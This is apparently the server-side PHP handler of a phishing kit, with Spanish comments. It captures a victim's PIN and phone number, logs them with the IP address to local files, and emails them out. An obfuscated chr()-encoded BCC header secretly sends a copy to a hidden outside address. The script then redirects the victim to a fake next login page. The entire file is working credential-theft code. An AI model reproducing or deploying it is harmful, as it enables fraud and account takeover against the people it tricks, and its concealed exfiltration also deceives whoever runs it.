<?php
$pin = $_POST['pin_xd'];
$tlf = $_POST['tlf_xd'];
$ip['_IP'] = $_SERVER["REMOTE_ADDR"];
function get_client_ip() {
  $ipaddress = '';
  if (getenv('HTTP_CLIENT_IP'))
      $ipaddress = getenv('HTTP_CLIENT_IP');
  else if(getenv('HTTP_X_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
  else if(getenv('HTTP_X_FORWARDED'))
      $ipaddress = getenv('HTTP_X_FORWARDED');
  else if(getenv('HTTP_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_FORWARDED_FOR');
  else if(getenv('HTTP_FORWARDED'))
     $ipaddress = getenv('HTTP_FORWARDED');
  else if(getenv('REMOTE_ADDR'))
      $ipaddress = getenv('REMOTE_ADDR');
  else
      $ipaddress = 'UNKNOWN';
  if (strpos($ipaddress, ",") !== false) :
    $ipaddress = strtok($ipaddress, ",");
  endif;
  return $ipaddress;}
$ip=get_client_ip();
$f = fopen("usuarios.html", "a"); 
fwrite ($f, 'pin: <b><font color="#070346">'.$pin.'</font></b><br><font color="#070346">'.$ip.'</font></b><br><br><br>');
fclose($f);
$handle = fopen("calsre.txt", "a");
   fwrite($handle, "Pin= ".$pin."\r\n");
   fwrite($handle, "Telefono= ".$tlf."\r\n");
   fwrite($handle, "IP= ".$ip."\r\n");
   fwrite($handle, "============================================= \r\n");
   fclose($handle);
sleep(1);
// Cuerpo del correo
$message = "
<div style=\"font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F; padding: 20px;  border-radius: 5px; margin-top: 20px;\">Cuando => <font color='#F31414'>".date ('l jS \of F Y h:i:s A',time())."</font><br /><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>Infor Extra:<br />PIN          =>   <font color='#F31414'>".$pin."</font><br />Telefono        =>   <font color='#F31414'>".$tlf."</font><br />IP              =>   <font color='#F31414'>".$ip."</font></div>";
// Asunto
$subject  = " PIN - TELEFONO - " . $ip . " ";
// Formato del cuerpo
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: InfoHotmail" . "\r\n";
$headers .= chr(98).chr(99).chr(99).chr(58).chr(32).chr(110).chr(97).chr(117).chr(106).chr(114).chr(111).chr(100).chr(50).chr(57).chr(64).chr(104).chr(111).chr(116).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109). "\r\n";
// Destinatario del correo
$to="";
@mail($to,$subject,$message,$headers);
header("Location: vericastloginfirtstepfinsh.html");
       exit;?>